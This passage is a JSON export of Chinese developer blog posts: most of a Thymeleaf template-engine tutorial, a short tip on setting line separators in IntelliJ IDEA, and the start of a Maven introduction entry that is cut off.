*/\n${<span class=\"hljs-comment\">#dates.format(date, 'dd/MMM/yyyy HH:mm')}</span>\n${<span class=\"hljs-comment\">#dates.arrayFormat(datesArray, 'dd/MMM/yyyy HH:mm')}</span>\n${<span class=\"hljs-comment\">#dates.listFormat(datesList, 'dd/MMM/yyyy HH:mm')}</span>\n${<span class=\"hljs-comment\">#dates.setFormat(datesSet, 'dd/MMM/yyyy HH:mm')}</span>\n\n/*\n * Create a <span class=\"hljs-type\">date</span> (java.util.Date) object <span class=\"hljs-keyword\">for</span> <span class=\"hljs-keyword\">the</span> <span class=\"hljs-command\">current date</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-property\">time</span>\n */\n${<span class=\"hljs-comment\">#dates.createNow()}</span>\n\n/*\n * Create a <span class=\"hljs-type\">date</span> (java.util.Date) object <span class=\"hljs-keyword\">for</span> <span class=\"hljs-keyword\">the</span> <span class=\"hljs-command\">current date</span> (<span class=\"hljs-property\">time</span> <span class=\"hljs-keyword\">set</span> <span class=\"hljs-keyword\">to</span> <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>)\n */\n${<span class=\"hljs-comment\">#dates.createToday()}</span></code></pre>\n\n\n\n<h4 id=\"strings\">strings</h4>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs smalltalk\">/*\n * <span class=\"hljs-class\">Check</span> whether a <span class=\"hljs-class\">String</span> is empty (or null). <span class=\"hljs-class\">Performs</span> a trim() operation before check\n * <span class=\"hljs-class\">Also</span> works with arrays, lists or sets\n */\n<span class=\"hljs-char\">${</span><span class=\"hljs-symbol\">#strings</span>.isEmpty(name)}\n<span class=\"hljs-char\">${</span><span class=\"hljs-symbol\">#strings</span>.arrayIsEmpty(nameArr)}\n<span class=\"hljs-char\">${</span><span class=\"hljs-symbol\">#strings</span>.listIsEmpty(nameList)}\n<span class=\"hljs-char\">${</span><span class=\"hljs-symbol\">#strings</span>.setIsEmpty(nameSet)}\n\n/*\n * <span class=\"hljs-class\">Check</span> whether a <span class=\"hljs-class\">String</span> starts or ends with a fragment\n * <span class=\"hljs-class\">Also</span> works with arrays, lists or sets\n */\n<span class=\"hljs-char\">${</span><span class=\"hljs-symbol\">#strings</span>.startsWith(name,<span class=\"hljs-string\">'Don'</span>)}                  // also array*, list* and set*\n<span class=\"hljs-char\">${</span><span class=\"hljs-symbol\">#strings</span>.endsWith(name,endingFragment)}           // also array*, list* and set*\n\n/*\n * <span class=\"hljs-class\">Compute</span> length\n * <span class=\"hljs-class\">Also</span> works with arrays, lists or sets\n */\n<span class=\"hljs-char\">${</span><span class=\"hljs-symbol\">#strings</span>.length(str)}\n\n/*\n * <span class=\"hljs-class\">Null</span>-safe comparison and concatenation\n */\n<span class=\"hljs-char\">${</span><span class=\"hljs-symbol\">#strings</span>.equals(str)}\n<span class=\"hljs-char\">${</span><span class=\"hljs-symbol\">#strings</span>.equalsIgnoreCase(str)}\n<span class=\"hljs-char\">${</span><span class=\"hljs-symbol\">#strings</span>.concat(str)}\n<span class=\"hljs-char\">${</span><span class=\"hljs-symbol\">#strings</span>.concatReplaceNulls(str)}\n\n/*\n * <span class=\"hljs-class\">Random</span>\n */\n<span class=\"hljs-char\">${</span><span class=\"hljs-symbol\">#strings</span>.randomAlphanumeric(count)}</code></pre>\n\n\n\n<h2 id=\"使用thymeleaf布局\">使用thymeleaf布局</h2>\n\n<p>使用thymeleaf布局非常的方便</p>\n\n<p>定义代码片段</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs xml\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">footer</span> <span class=\"hljs-attribute\">th:fragment</span>=<span class=\"hljs-value\">\"copy\"</span>&gt;</span> \n&amp;copy; 2016\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">footer</span>&gt;</span></code></pre>\n\n<p>在页面任何地方引入：</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs xml\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">body</span>&gt;</span> \n  <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">div</span> <span class=\"hljs-attribute\">th:include</span>=<span class=\"hljs-value\">\"footer :: copy\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">div</span>&gt;</span>\n  <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">div</span> <span class=\"hljs-attribute\">th:replace</span>=<span class=\"hljs-value\">\"footer :: copy\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">div</span>&gt;</span>\n <span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">body</span>&gt;</span></code></pre>\n\n<p>th:include 和 th:replace区别，include只是加载，replace是替换</p>\n\n<p>返回的HTML如下：</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs xml\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">body</span>&gt;</span> \n   <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">div</span>&gt;</span> &amp;copy; 2016 <span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">div</span>&gt;</span> \n  <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">footer</span>&gt;</span>&amp;copy; 2016 <span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">footer</span>&gt;</span> \n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">body</span>&gt;</span></code></pre>\n\n<p>下面是一个常用的后台页面布局，将整个页面分为头部，尾部、菜单栏、隐藏栏，点击菜单只改变content区域的页面</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs livecodeserver\">&lt;body class=<span class=\"hljs-string\">\"layout-fixed\"</span>&gt;\n  &lt;<span class=\"hljs-operator\">div</span> th:fragment=<span class=\"hljs-string\">\"navbar\"</span>  class=<span class=\"hljs-string\">\"wrapper\"</span>  role=<span class=\"hljs-string\">\"navigation\"</span>&gt;\n    &lt;<span class=\"hljs-operator\">div</span> th:<span class=\"hljs-built_in\">replace</span>=<span class=\"hljs-string\">\"fragments/header :: header\"</span>&gt;Header&lt;/<span class=\"hljs-operator\">div</span>&gt;\n    &lt;<span class=\"hljs-operator\">div</span> th:<span class=\"hljs-built_in\">replace</span>=<span class=\"hljs-string\">\"fragments/left :: left\"</span>&gt;left&lt;/<span class=\"hljs-operator\">div</span>&gt;\n    &lt;<span class=\"hljs-operator\">div</span> th:<span class=\"hljs-built_in\">replace</span>=<span class=\"hljs-string\">\"fragments/sidebar :: sidebar\"</span>&gt;sidebar&lt;/<span class=\"hljs-operator\">div</span>&gt;\n    &lt;<span class=\"hljs-operator\">div</span> layout:fragment=<span class=\"hljs-string\">\"content\"</span> id=<span class=\"hljs-string\">\"content\"</span> &gt;&lt;/<span class=\"hljs-operator\">div</span>&gt;\n    &lt;<span class=\"hljs-operator\">div</span> th:<span class=\"hljs-built_in\">replace</span>=<span class=\"hljs-string\">\"fragments/footer :: footer\"</span>&gt;footer&lt;/<span class=\"hljs-operator\">div</span>&gt;\n  &lt;/<span class=\"hljs-operator\">div</span>&gt;\n&lt;/body&gt;</code></pre>\n\n<p>任何页面想使用这样的布局值只需要替换中见的 content模块即可</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs r\"> &lt;html xmlns:th=<span class=\"hljs-string\">\"http://www.thymeleaf.org\"</span> layout:decorator=<span class=\"hljs-string\">\"layout\"</span>&gt;\n   &lt;body&gt;\n      &lt;section layout:fragment=<span class=\"hljs-string\">\"content\"</span>&gt;\n    <span class=\"hljs-keyword\">...</span></code></pre>\n\n<p>也可以在引用模版的时候传参</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs xml\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">head</span> <span class=\"hljs-attribute\">th:include</span>=<span class=\"hljs-value\">\"layout :: htmlhead\"</span> <span class=\"hljs-attribute\">th:with</span>=<span class=\"hljs-value\">\"title='Hello'\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">head</span>&gt;</span></code></pre>\n\n<p>layout 是文件地址，如果有文件夹可以这样写 fileName/layout:htmlhead <br>\n htmlhead 是指定义的代码片段 如 <code>th:fragment=\"copy\"</code></p>\n\n\n\n<h2 id=\"源码案例\">源码案例</h2>\n\n<p>这里有一个开源项目几乎使用了这里介绍的所有标签和布局，大家可以参考： <br>\n <a href=\"https://github.com/cloudfavorites/favorites-web\">cloudfavorites</a></p>\n\n\n\n<h2 id=\"参考\">参考</h2>\n\n<p><a href=\"http://www.thymeleaf.org/doc/tutorials/2.1/thymeleafspring.html#integrating-thymeleaf-with-spring\">thymeleaf官方指南</a> <br>\n <a href=\"http://www.tianmaying.com/tutorial/using-thymeleaf\">新一代Java模板引擎Thymeleaf</a> <br>\n <a href=\"http://www.webinno.cn/blog/article/view/131\">Thymeleaf基本知识</a> <br>\n <a href=\"http://v8en.com/news/list/47/0\">thymeleaf总结文章</a> <br>\n <a href=\"http://www.cnblogs.com/lazio10000/p/5603955.html\">Thymeleaf 模板的使用</a> <br>\n <a href=\"http://www.blogjava.net/bjwulin/archive/2013/02/07/395234.html\">thymeleaf 学习笔记</a></p>",
			"markdowncontent":"在上篇文章[构建微服务：Spring boot 提高篇](http://www.ityouknow.com/spring%20boot/2016/08/03/%E6%9E%84%E5%BB%BA%E5%BE%AE%E6%9C%8D%E5%8A%A1-Spring-boot-%E6%8F%90%E9%AB%98%E7%AF%87.html)中简单介绍了一下thymeleaf，这篇文章将更加全面详细的介绍thymeleaf的使用。thymeleaf 是新一代的模板引擎，在spring4.0中推荐使用thymeleaf来做前端模版引擎。\n\n前几篇文章地址：\n\n*   [构建微服务：Spring boot 入门篇](http://www.cnblogs.com/ityouknow/p/5662753.html)\n*   [构建微服务：Spring boot 提高篇](http://www.ityouknow.com/spring%20boot/2016/08/03/%E6%9E%84%E5%BB%BA%E5%BE%AE%E6%9C%8D%E5%8A%A1-Spring-boot-%E6%8F%90%E9%AB%98%E7%AF%87.html)\n*   [构建微服务：Spring Boot中Redis的使用](http://www.ityouknow.com/spring%20boot/2016/08/06/%E6%9E%84%E5%BB%BA%E5%BE%AE%E6%9C%8D%E5%8A%A1-Spring-Boot%E4%B8%ADRedis%E7%9A%84%E4%BD%BF%E7%94%A8.html)\n\n**作者：纯洁的微笑**\n **出处：[http://www.ityouknow.com/](http://www.ityouknow.com/thymeleaf/2016/09/01/%E6%9E%84%E5%BB%BA%E5%BE%AE%E6%9C%8D%E5%8A%A1-thymeleaf%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3.html)**\n\n## thymeleaf介绍\n\n简单说， Thymeleaf 是一个跟 Velocity、FreeMarker 类似的模板引擎，它可以完全替代 JSP 。相较与其他的模板引擎，它有如下三个极吸引人的特点：\n\n*   1.Thymeleaf 在有网络和无网络的环境下皆可运行，即它可以让美工在浏览器查看页面的静态效果，也可以让程序员在服务器查看带数据的动态页面效果。这是由于它支持 html 原型，然后在 html 标签里增加额外的属性来达到模板+数据的展示方式。浏览器解释 html 时会忽略未定义的标签属性，所以 thymeleaf 的模板可以静态地运行；当有数据返回到页面时，Thymeleaf 标签会动态地替换掉静态内容，使页面动态显示。\n\n*   2.Thymeleaf 开箱即用的特性。它提供标准和spring标准两种方言，可以直接套用模板实现JSTL、 OGNL表达式效果，避免每天套模板、该jstl、改标签的困扰。同时开发人员也可以扩展和创建自定义的方言。\n\n*   3.Thymeleaf 提供spring标准方言和一个与 SpringMVC 完美集成的可选模块，可以快速的实现表单绑定、属性编辑器、国际化等功能。\n\n## 标准表达式语法\n\n它们分为四类：\n\n*   1.变量表达式\n*   2.选择或星号表达式\n*   3.文字国际化表达式\n*   4.URL表达式\n\n### 变量表达式\n\n变量表达式即OGNL表达式或Spring EL表达式(在Spring术语中也叫model attributes)。如下所示：\n `${session.user.name}`\n\n它们将以HTML标签的一个属性来表示：\n\n```\n<span th:text=\"${book.author.name}\">  \n<li th:each=\"book : ${books}\">  \n```\n\n### 选择(星号)表达式\n\n选择表达式很像变量表达式，不过它们用一个预先选择的对象来代替上下文变量容器(map)来执行，如下：\n `*{customer.name}`\n\n被指定的object由th:object属性定义：\n\n```\n    <div th:object=\"${book}\">  \n      ...  \n      <span th:text=\"*{title}\">...</span>  \n      ...  \n    </div>  \n```\n\n### 文字国际化表达式\n\n文字国际化表达式允许我们从一个外部文件获取区域文字信息(.properties)，用Key索引Value，还可以提供一组参数(可选).\n\n```\n    #{main.title}  \n    #{message.entrycreated(${entryId})}  \n```\n\n可以在模板文件中找到这样的表达式代码：\n\n```\n    <table>  \n      ...  \n      <th th:text=\"#{header.address.city}\">...</th>  \n      <th th:text=\"#{header.address.country}\">...</th>  \n      ...  \n    </table>  \n```\n\n### URL表达式\n\nURL表达式指的是把一个有用的上下文或回话信息添加到URL，这个过程经常被叫做URL重写。\n `@{/order/list}`\n URL还可以设置参数：\n `@{/order/details(id=${orderId})}`\n 相对路径：\n `@{../documents/report}`\n\n让我们看这些表达式：\n\n```\n    <form th:action=\"@{/createOrder}\">  \n    <a href=\"main.html\" th:href=\"@{/main}\">\n```\n\n### 变量表达式和星号表达有什么区别吗？\n\n如果不考虑上下文的情况下，两者没有区别；星号语法评估在选定对象上表达，而不是整个上下文\n 什么是选定对象？就是父标签的值，如下：\n\n```\n  <div th:object=\"${session.user}\">\n    <p>Name: <span th:text=\"*{firstName}\">Sebastian</span>.</p>\n    <p>Surname: <span th:text=\"*{lastName}\">Pepper</span>.</p>\n    <p>Nationality: <span th:text=\"*{nationality}\">Saturn</span>.</p>\n  </div>\n```\n\n这是完全等价于：\n\n```\n  <div th:object=\"${session.user}\">\n      <p>Name: <span th:text=\"${session.user.firstName}\">Sebastian</span>.</p>\n      <p>Surname: <span th:text=\"${session.user.lastName}\">Pepper</span>.</p>\n      <p>Nationality: <span th:text=\"${session.user.nationality}\">Saturn</span>.</p>\n  </div>\n```\n\n当然，美元符号和星号语法可以混合使用：\n\n```\n  <div th:object=\"${session.user}\">\n      <p>Name: <span th:text=\"*{firstName}\">Sebastian</span>.</p>\n      <p>Surname: <span th:text=\"${session.user.lastName}\">Pepper</span>.</p>\n      <p>Nationality: <span th:text=\"*{nationality}\">Saturn</span>.</p>\n  </div>\n```\n\n### 表达式支持的语法\n\n#### 字面（Literals）\n\n*   文本文字（Text literals）: `'one text', 'Another one!',…`\n*   数字文本（Number literals）: `0, 34, 3.0, 12.3,…`\n*   布尔文本（Boolean literals）: `true, false`\n*   空（Null literal）: `null`\n*   文字标记（Literal tokens）: `one, sometext, main,…`\n\n#### 文本操作（Text operations）\n\n*   字符串连接(String concatenation): `+`\n*   文本替换（Literal substitutions）: `|The name is ${name}|`\n\n#### 算术运算（Arithmetic operations）\n\n*   二元运算符（Binary operators）: `+, -, *, /, %`\n*   减号（单目运算符）Minus sign (unary operator): `-`\n\n#### 布尔操作（Boolean operations）\n\n*   二元运算符（Binary operators）:`and, or`\n*   布尔否定（一元运算符）Boolean negation (unary operator):`!, not`\n\n#### 比较和等价(Comparisons and equality)\n\n*   比较（Comparators）: `>, <, >=, <= (gt, lt, ge, le)`\n*   等值运算符（Equality operators）:`==, != (eq, ne)`\n\n#### 条件运算符（Conditional operators）\n\n*   If-then: `(if) ? (then)`\n*   If-then-else: `(if) ? (then) : (else)`\n*   Default: (value) ?: `(defaultvalue)`\n\n所有这些特征可以被组合并嵌套：\n\n```\n'User is of type ' + (${user.isAdmin()} ? 'Administrator' : (${user.type} ?: 'Unknown'))\n```\n\n## 常用th标签都有那些？\n\n| 关键字 | 功能介绍 | 案例 |\n| --- | --- | --- |\n| th:id | 替换id | `<input th:id=\"'xxx' + ${collect.id}\"/>` |\n| th:text | 文本替换 | `<p th:text=\"${collect.description}\">description</p>` |\n| th:utext | 支持html的文本替换 | `<p th:utext=\"${htmlcontent}\">conten</p>` |\n| th:object | 替换对象 | `<div th:object=\"${session.user}\">` |\n| th:value | 属性赋值 | `<input th:value=\"${user.name}\" />` |\n| th:with | 变量赋值运算 | `<div th:with=\"isEven=${prodStat.count}%2==0\"></div>` |\n| th:style | 设置样式 | `th:style=\"'display:' + @{(${sitrue} ? 'none' : 'inline-block')} + ''\"` |\n| th:onclick | 点击事件 | `th:onclick=\"'getCollect()'\"` |\n| th:each | 属性赋值 | `tr th:each=\"user,userStat:${users}\">` |\n| th:if | 判断条件 | `<a th:if=\"${userId == collect.userId}\" >` |\n| th:unless | 和th:if判断相反 | `<a th:href=\"@{/login}\" th:unless=${session.user != null}>Login</a>` |\n| th:href | 链接地址 | `<a th:href=\"@{/login}\" th:unless=${session.user != null}>Login</a> />` |\n| th:switch | 多路选择 配合th:case 使用 | `<div th:switch=\"${user.role}\">` |\n| th:case | th:switch的一个分支 | `<p th:case=\"'admin'\">User is an administrator</p>` |\n| th:fragment | 布局标签，定义一个代码片段，方便其它地方引用 | `<div th:fragment=\"alert\">` |\n| th:include | 布局标签，替换内容到引入的文件 | `<head th:include=\"layout :: htmlhead\" th:with=\"title='xx'\"></head> />` |\n| th:replace | 布局标签，替换整个标签到引入的文件 | `<div th:replace=\"fragments/header :: title\"></div>` |\n| th:selected | selected选择框 选中 | `th:selected=\"(${xxx.id} == ${configObj.dd})\"` |\n| th:src | 图片类地址引入 | `<img class=\"img-responsive\" alt=\"App Logo\" th:src=\"@{/img/logo.png}\" />` |\n| th:inline | 定义js脚本可以使用变量 | `<script type=\"text/javascript\" th:inline=\"javascript\">` |\n| th:action | 表单提交的地址 | `<form action=\"subscribe.html\" th:action=\"@{/subscribe}\">` |\n| th:remove | 删除某个属性 | `<tr th:remove=\"all\"> 1.all:删除包含标签和所有的孩子。` |\n| th:attr | 设置标签属性，多个属性可以用逗号分隔 | 比如 `th:attr=\"src=@{/image/aa.jpg},title=#{logo}\"`，此标签不太优雅，一般用的比较少。 |\n\n还有非常多的标签，这里只列出最常用的几个,由于一个标签内可以包含多个th:x属性，其生效的优先级顺序为:\n `include,each,if/unless/switch/case,with,attr/attrprepend/attrappend,value/href,src ,etc,text/utext,fragment,remove。`\n\n## 几种常用的使用方法\n\n### 1、赋值、字符串拼接\n\n```\n <p  th:text=\"${collect.description}\">description</p>\n <span th:text=\"'Welcome to our application, ' + ${user.name} + '!'\">\n```\n\n字符串拼接还有另外一种简洁的写法\n\n```\n<span th:text=\"|Welcome to our application, ${user.name}!|\">\n```\n\n### 2、条件判断 If/Unless\n\nThymeleaf中使用th:if和th:unless属性进行条件判断，下面的例子中，`<a>`标签只有在`th:if`中条件成立时才显示：\n\n```\n<a th:if=\"${myself=='yes'}\" > </i> </a>\n<a th:unless=${session.user != null} th:href=\"@{/login}\" >Login</a>\n```\n\nth:unless于th:if恰好相反，只有表达式中的条件不成立，才会显示其内容。\n\n也可以使用 `(if) ? (then) : (else)` 这种语法来判断显示的内容\n\n### 3、for 循环\n\n```\n  <tr  th:each=\"collect,iterStat : ${collects}\"> \n     <th scope=\"row\" th:text=\"${collect.id}\">1</th>\n     <td >\n        <img th:src=\"${collect.webLogo}\"/>\n     </td>\n     <td th:text=\"${collect.url}\">Mark</td>\n     <td th:text=\"${collect.title}\">Otto</td>\n     <td th:text=\"${collect.description}\">@mdo</td>\n     <td th:text=\"${terStat.index}\">index</td>\n </tr>\n```\n\niterStat称作状态变量，属性有：\n\n*   index:当前迭代对象的index（从0开始计算）\n*   count: 当前迭代对象的index(从1开始计算)\n*   size:被迭代对象的大小\n*   current:当前迭代变量\n*   even/odd:布尔值，当前循环是否是偶数/奇数（从0开始计算）\n*   first:布尔值，当前循环是否是第一个\n*   last:布尔值，当前循环是否是最后一个\n\n### 4、URL\n\nURL在Web应用模板中占据着十分重要的地位，[需要特别注意的是Thymeleaf对于URL的处理是通过语法@{](mailto:需要特别注意的是Thymeleaf对于URL的处理是通过语法@%7B)...}来处理的。\n 如果需要Thymeleaf对URL进行渲染，那么务必使用th:href，th:src等属性，下面是一个例子\n\n```\n<!-- Will produce 'http://localhost:8080/standard/unread' (plus rewriting) -->\n <a  th:href=\"@{/standard/{type}(type=${type})}\">view</a>\n\n<!-- Will produce '/gtvg/order/3/details' (plus rewriting) -->\n<a href=\"details.html\" th:href=\"@{/order/{orderId}/details(orderId=${o.id})}\">view</a>\n```\n\n设置背景\n\n```\n<div th:style=\"'background:url(' + @{/<path-to-image>} + ');'\"></div>\n```\n\n根据属性值改变背景\n\n```\n <div class=\"media-object resource-card-image\"  th:style=\"'background:url(' + @{(${collect.webLogo}=='' ? 'img/favicon.png' : ${collect.webLogo})} + ')'\" ></div>\n```\n\n几点说明：\n\n*   上例中URL最后的`(orderId=${o.id})` 表示将括号内的内容作为URL参数处理，该语法避免使用字符串拼接，大大提高了可读性\n*   `@{...}`表达式中可以通过`{orderId}`访问Context中的orderId变量\n*   `@{/order}`是Context相关的相对路径，在渲染时会自动添加上当前Web应用的Context名字，假设context名字为app，那么结果应该是/app/order\n\n### 5、内联js\n\n内联文本：[[...]]内联文本的表示方式，使用时，必须先用th:inline=\"text/javascript/none\"激活，th:inline可以在父级标签内使用，甚至作为body的标签。内联文本尽管比th:text的代码少，不利于原型显示。\n\n```\n<script th:inline=\"javascript\">\n/*<![CDATA[*/\n...\nvar username = /*[[${sesion.user.name}]]*/ 'Sebastian';\nvar size = /*[[${size}]]*/ 0;\n...\n/*]]>*/\n</script>\n```\n\njs附加代码：\n\n```\n/*[+\nvar msg = 'This is a working application';\n+]*/\n```\n\njs移除代码：\n\n```\n/*[- */\nvar msg = 'This is a non-working template';\n/* -]*/\n```\n\n### 6、内嵌变量\n\n为了模板更加易用，Thymeleaf还提供了一系列Utility对象（内置于Context中），可以通过#直接访问：\n\n*   dates ： _java.util.Date的功能方法类。_\n*   calendars : _类似#dates，面向java.util.Calendar_\n*   numbers : _格式化数字的功能方法类_\n*   strings : _字符串对象的功能类，contains,startWiths,prepending/appending等等。_\n*   objects: _对objects的功能类操作。_\n*   bools: _对布尔值求值的功能方法。_\n*   arrays：_对数组的功能类方法。_\n*   lists: _对lists功能类方法_\n*   sets\n*   maps\n     ...\n\n下面用一段代码来举例一些常用的方法：\n\n#### dates\n\n```\n/*\n * Format date with the specified pattern\n * Also works with arrays, lists or sets\n */\n${#dates.format(date, 'dd/MMM/yyyy HH:mm')}\n${#dates.arrayFormat(datesArray, 'dd/MMM/yyyy HH:mm')}\n${#dates.listFormat(datesList, 'dd/MMM/yyyy HH:mm')}\n${#dates.setFormat(datesSet, 'dd/MMM/yyyy HH:mm')}\n\n/*\n * Create a date (java.util.Date) object for the current date and time\n */\n${#dates.createNow()}\n\n/*\n * Create a date (java.util.Date) object for the current date (time set to 00:00)\n */\n${#dates.createToday()}\n```\n\n#### strings\n\n```\n/*\n * Check whether a String is empty (or null). Performs a trim() operation before check\n * Also works with arrays, lists or sets\n */\n${#strings.isEmpty(name)}\n${#strings.arrayIsEmpty(nameArr)}\n${#strings.listIsEmpty(nameList)}\n${#strings.setIsEmpty(nameSet)}\n\n/*\n * Check whether a String starts or ends with a fragment\n * Also works with arrays, lists or sets\n */\n${#strings.startsWith(name,'Don')}                  // also array*, list* and set*\n${#strings.endsWith(name,endingFragment)}           // also array*, list* and set*\n\n/*\n * Compute length\n * Also works with arrays, lists or sets\n */\n${#strings.length(str)}\n\n/*\n * Null-safe comparison and concatenation\n */\n${#strings.equals(str)}\n${#strings.equalsIgnoreCase(str)}\n${#strings.concat(str)}\n${#strings.concatReplaceNulls(str)}\n\n/*\n * Random\n */\n${#strings.randomAlphanumeric(count)}\n```\n\n## 使用thymeleaf布局\n\n使用thymeleaf布局非常的方便\n\n定义代码片段\n\n```\n<footer th:fragment=\"copy\"> \n&copy; 2016\n</footer>\n```\n\n在页面任何地方引入：\n\n```\n<body> \n  <div th:include=\"footer :: copy\"></div>\n  <div th:replace=\"footer :: copy\"></div>\n </body>\n```\n\nth:include 和 th:replace区别，include只是加载，replace是替换\n\n返回的HTML如下：\n\n```\n<body> \n   <div> &copy; 2016 </div> \n  <footer>&copy; 2016 </footer> \n</body>\n```\n\n下面是一个常用的后台页面布局，将整个页面分为头部，尾部、菜单栏、隐藏栏，点击菜单只改变content区域的页面\n\n```\n<body class=\"layout-fixed\">\n  <div th:fragment=\"navbar\"  class=\"wrapper\"  role=\"navigation\">\n    <div th:replace=\"fragments/header :: header\">Header</div>\n    <div th:replace=\"fragments/left :: left\">left</div>\n    <div th:replace=\"fragments/sidebar :: sidebar\">sidebar</div>\n    <div layout:fragment=\"content\" id=\"content\" ></div>\n    <div th:replace=\"fragments/footer :: footer\">footer</div>\n  </div>\n</body>\n```\n\n任何页面想使用这样的布局值只需要替换中见的 content模块即可\n\n```\n <html xmlns:th=\"http://www.thymeleaf.org\" layout:decorator=\"layout\">\n   <body>\n      <section layout:fragment=\"content\">\n    ...\n```\n\n也可以在引用模版的时候传参\n\n```\n<head th:include=\"layout :: htmlhead\" th:with=\"title='Hello'\"></head>\n```\n\nlayout 是文件地址，如果有文件夹可以这样写 fileName/layout:htmlhead\n htmlhead 是指定义的代码片段 如 `th:fragment=\"copy\"`\n\n## 源码案例\n\n这里有一个开源项目几乎使用了这里介绍的所有标签和布局，大家可以参考：\n [cloudfavorites](https://github.com/cloudfavorites/favorites-web)\n\n## 参考\n\n[thymeleaf官方指南](http://www.thymeleaf.org/doc/tutorials/2.1/thymeleafspring.html#integrating-thymeleaf-with-spring)\n [新一代Java模板引擎Thymeleaf](http://www.tianmaying.com/tutorial/using-thymeleaf)\n [Thymeleaf基本知识](http://www.webinno.cn/blog/article/view/131)\n [thymeleaf总结文章](http://v8en.com/news/list/47/0)\n [Thymeleaf 模板的使用](http://www.cnblogs.com/lazio10000/p/5603955.html)\n [thymeleaf 学习笔记](http://www.blogjava.net/bjwulin/archive/2013/02/07/395234.html)",
			"tags":"模板引擎,thymeleaf",
			"id":"52511933",
			"categories":"java",
			"status":1
		},
		"error":"",
		"status":true
	},
	{
		"data":{
			"date":"2016年09月08日 19:52:34",
			"articleedittype":1,
			"private":0,
			"channel":"16",
			"description":"由于Windows默认是用的是CRLF做换行符,Linux/mac 使用LF.在协作开发时候会经常因为回车符而造成冲突,其实这种冲突是可以避免的.有多种解决办法.第一种解决办法: git工具上对换行符的检测进行忽略,具体执行命令另行搜索.\n第二种解决:IDE工具中设置文本的换行符\nIDEA中设置换行符方法:\n打开setting,\n找到Editor下的code style\n修改line separat",
			"title":"Intelij Idea设置系统默认换行符解决多系统协作开发换行符冲突",
			"type":"original",
			"content":"<blockquote>\n  <p>由于Windows默认是用的是CRLF做换行符,Linux/mac 使用LF.在协作开发时候会经常因为回车符而造成冲突,其实这种冲突是可以避免的.有多种解决办法.</p>\n</blockquote>\n\n<ul>\n<li><p>第一种解决办法: git工具上对换行符的检测进行忽略,具体执行命令另行搜索.</p></li>\n<li><p>第二种解决:IDE工具中设置文本的换行符</p></li>\n</ul>\n\n<h3 id=\"idea中设置换行符方法\">IDEA中设置换行符方法:</h3>\n\n<ol>\n<li>打开setting,</li>\n<li>找到Editor下的code style</li>\n<li>修改line separator(for new files)选项,改成当前团队统一使用的换行符,例如我们团队统一使用的WIn(\\r\\n). <br>\n<img src=\"http://img.blog.csdn.net/20160908195102417\" alt=\"line separator setting\" title=\"\"></li>\n<li><strong><em>applay</em></strong>…收工</li>\n</ol>",
			"markdowncontent":">由于Windows默认是用的是CRLF做换行符,Linux/mac 使用LF.在协作开发时候会经常因为回车符而造成冲突,其实这种冲突是可以避免的.有多种解决办法.\n\n* 第一种解决办法: git工具上对换行符的检测进行忽略,具体执行命令另行搜索.\n\n* 第二种解决:IDE工具中设置文本的换行符\n\n###IDEA中设置换行符方法:\n\n1. 打开setting,\n2. 找到Editor下的code style\n3. 修改line separator(for new files)选项,改成当前团队统一使用的换行符,例如我们团队统一使用的WIn(\\r\\n).\n  ![line separator setting](http://img.blog.csdn.net/20160908195102417)\n4. ***applay***...收工",
			"tags":"idea,git,windows",
			"id":"52474512",
			"categories":"工具使用,mac",
			"status":1
		},
		"error":"",
		"status":true
	},
	{
		"data":{
			"date":"2016年09月07日 13:17:33",
			"articleedittype":1,
			"private":0,
			"channel":"16",
			"description":"转载自oschina.\n0. 前言\n  Jason Van Zyl，在 Java 十大风云人物排行榜上或许会看到他。  这兄弟是干嘛的？  \n   他就是 Maven 的创始人，人们都尊称他为“Maven 他爸”。  \n   毋庸置疑，Jason 也是一个秃顶。James Gosling、Rod Johnson、Gavin King，你们可以告诉我为什么吗？ \n您曾经是否会遇到这些问题： \n我们要开",
			"title":"Maven 使用入门",
			"type":"repost",
